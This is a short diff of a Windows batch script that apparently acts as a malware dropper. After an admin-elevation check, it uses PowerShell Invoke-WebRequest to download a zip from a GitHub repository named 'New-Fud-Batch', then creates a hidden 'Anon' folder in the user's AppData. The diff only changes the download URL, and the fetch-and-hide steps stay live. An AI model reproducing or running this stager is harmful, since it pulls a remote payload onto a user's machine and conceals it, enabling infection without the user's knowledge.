@@ -19,7 +19,7 @@ if '%errorlevel%' NEQ '0' (
     pushd "%CD%"
     CD /D "%~dp0
 
-Powershell -Command "Invoke-Webrequest 'https://github.com/AnonAm93/New-Fud-Batch/raw/main/.zip' -OutFile .zip"
+Powershell -Command "Invoke-Webrequest 'https://github.com/AnonAm93/New-Fud-Batch/blob/main/.zip' -OutFile .zip"
 cd "C:\Users\%USERNAME%\AppData\Local"
 mkdir "Anon"
 attrib +h "Anon" /s /d
